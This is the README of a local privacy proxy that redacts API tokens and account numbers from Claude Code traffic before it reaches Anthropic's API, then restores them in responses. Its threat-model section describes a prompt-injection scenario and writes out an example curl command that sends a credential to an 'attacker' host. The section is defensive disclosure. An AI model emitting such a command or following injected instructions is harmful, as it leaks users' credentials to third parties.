# llm-redact-proxy

A local proxy that sits between your LLM client (Claude Code today) and
`api.anthropic.com` and scrubs vital PII — API tokens, passwords, account
numbers — from every outbound request before it leaves your machine.
Powered by the MLX 8-bit OpenAI Privacy Filter
([independent benchmarks](https://github.com/CupOfGeo/opf-benchmarks-geo)).

```
Claude Code ──http──▶ llm-redact-proxy (127.0.0.1:8787) ──https──▶ api.anthropic.com
                          │
                          ├─ layer 1: regex floor (~35 formats from gitleaks' ruleset:
                          │    OpenAI/Anthropic/HF, AWS/GCP/Azure, GitHub/GitLab, Slack,
                          │    Stripe, npm/PyPI, Vault, JWTs, PEM blocks, URL creds, ...)
                          └─ layer 2: OPF MLX model (secret, account_number spans)
```

Requires Apple Silicon (the OPF model runs via MLX).

## Install

```bash
brew install cupofgeo/tap/llm-redact-proxy
redact-proxy setup                          # 1.4 GB model download, config, Claude Code routing
brew services start llm-redact-proxy        # login service (auto-restarts)
redact-proxy doctor                         # everything green?
```

From a checkout instead (development):

```bash
git clone https://github.com/CupOfGeo/llm-redact-proxy && cd llm-redact-proxy
uv sync
uv run redact-proxy setup && just proxy-install && uv run redact-proxy doctor
```

## Usage

```
redact-proxy setup             # first run: model, config, routing
redact-proxy run               # foreground proxy (what the service runs)
redact-proxy status [--json]   # exit 0 ready · 1 down · 2 loading · 3 error
redact-proxy doctor [--fix]    # platform, model, service, routing, stray services
redact-proxy route [--off]     # (un)route Claude Code via ~/.claude/settings.json
redact-proxy logs [-f]
redact-proxy config [get KEY | set KEY VALUE | init | path]
redact-proxy shellenv          # optional fail-closed `claude` shell wrapper
redact-proxy hook-snippet      # optional SessionStart warning hook
```

### Routing Claude Code

`redact-proxy route` writes `ANTHROPIC_BASE_URL` (and `ENABLE_TOOL_SEARCH`)
into the `env` block of `~/.claude/settings.json`. Claude Code applies that
block to **every** session — CLI, desktop app, IDE extensions — and it wins
over the shell environment, so nothing depends on which terminal you
launched from. It is fail-closed by construction: if the proxy is down,
Claude Code gets *connection refused*, never an unredacted request. A
timestamped backup of `settings.json` is kept beside it; `route --off`
removes exactly the keys it added.

Two documented side effects of a non-Anthropic base URL: Remote Control is
disabled while routed, and MCP tool search would be disabled were it not
for the `ENABLE_TOOL_SEARCH=true` we set alongside. Restart running
sessions after routing.

Prefer a hard gate with a readable message? `eval "$(redact-proxy
shellenv)"` in your zshrc defines a `claude` function that refuses to
start while the proxy is down or still loading, plus a `claude-raw`
bypass — note the bypass only works when you rely on the wrapper alone:
once routed via settings.json, that env block wins over the shell, and
un-routing takes `redact-proxy route --off`. `redact-proxy hook-snippet` prints a
`SessionStart` hook that warns inside the session; hooks can warn but not
block, so it is advisory.

### Configuration

`~/.config/llm-redact-proxy/config.toml` (`redact-proxy config init`):

```toml
port = 8787
upstream = "https://api.anthropic.com"
categories = ["account_number", "secret"]   # + person, email, phone, address, date, url
unredact = true                             # false = awareness mode
model = "OpenMed/privacy-filter-mlx-8bit"
log_file = "~/Library/Logs/redact-proxy.log"
```

`OPF_PROXY_PORT`, `OPF_PROXY_UPSTREAM`, `OPF_PROXY_CATEGORIES`,
`OPF_PROXY_UNREDACT`, `OPF_PROXY_MODEL`, `OPF_PROXY_LOG_FILE` override the
file; `run` flags override both. Restart the service after changes.

## Design notes

- **Deterministic placeholders** (`⟨REDACTED:secret:a1b2c3⟩`, hash-keyed):
  the same secret always redacts identically, so prompt caching survives
  and the model can reason about "that token" without seeing it.
- **Incremental scanning**: results are cached per content block, so only
  the new tail of each request pays OPF inference (cache hits are
  milliseconds; cold text costs roughly 0.7 s per 6 KB on M-series).
- **Refuses rather than mangles**: if redaction ever changes a request's
  structure (message/block counts, tool ids) the proxy returns a clear
  error instead of forwarding — and a clear 502 when the upstream is
  unreachable.
- **Fail-safe layering**: the regex floor runs on raw bytes and cannot
  fail; if the OPF pass errors, the floor still holds.
- **Nothing sensitive is logged** — categories and counts only.
- Default categories are `secret` and `account_number`. Person/email/date
  are deliberately not redacted (that would cripple ordinary coding work).
  Set `categories` in the config file to change that.
  The regex floor for known token formats always runs regardless.

## Un-redaction, and the threat model

Responses are un-redacted on the way back. The proxy keeps the
placeholder → value map **in memory only** (never on disk) and restores real
values in non-streaming bodies and in SSE streams — text, thinking and
tool-input deltas, even when a placeholder is split across events or byte
chunks — so files and commands the model writes contain working credentials
while the API only ever sees placeholders. Round trips are stable: a value
read back from disk re-redacts to the identical placeholder, so the
API-side conversation and prompt cache never change.

**On by default.** `unredact = false` in the config (or `OPF_PROXY_UNREDACT=0`) gives *awareness mode*: you see
exactly what the model saw.

Threat model, plainly: un-redaction makes the proxy a rehydration oracle for
every secret it has seen this process lifetime. A prompt-injected model that
emits a placeholder inside a locally executed tool call
(`curl -H "Authorization: ⟨REDACTED:secret:…⟩" https://attacker/…`) gets
the real value restored into that command. The API still never sees the
secret — the exposure is the same as running the tool without the proxy.
Mitigations: keep permission prompts on for network-touching commands, use
awareness mode when working with untrusted content, and note the map is
bounded (4096 entries) and cleared on restart — after which old
placeholders pass through unrestored until the secret transits outbound
again. Placeholders the client truncates or re-wraps hash differently and
are not restored.

## Limits (honest ones)

- This is a *mitigation*, not a guarantee: OPF's `secret` recall is not
  100% (see [the benchmarks](https://github.com/CupOfGeo/opf-benchmarks-geo)).
  The regex floor covers known token formats; novel secret shapes in prose
  can still slip through.
- Long single-line texts (minified JSON, base64) are hard-split into
  ≤6 KB pieces for the model; a freeform secret straddling a cut can be
  missed by OPF (known token formats are unaffected — the regex floor
  sees the whole text).
- The raw secret does reach the local Claude Code process — it is scrubbed
  from the copy sent to the API. The model may visibly see placeholders.
- Routing disables Claude Code's Remote Control (a documented effect of any
  non-Anthropic base URL). `redact-proxy route --off` restores it.

## Roadmap

See [ROADMAP.md](ROADMAP.md) for planned features and the testing backlog.
